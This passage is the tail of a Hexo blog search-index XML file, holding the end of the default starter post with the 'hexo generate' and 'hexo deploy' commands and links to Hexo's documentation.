href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
